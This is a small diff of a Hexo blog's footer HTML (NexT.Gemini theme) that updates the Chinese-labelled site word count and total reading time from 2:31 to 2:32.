+    <span title="站点总字数">167k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:31</span>
+    <span title="站点阅读时长">2:32</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
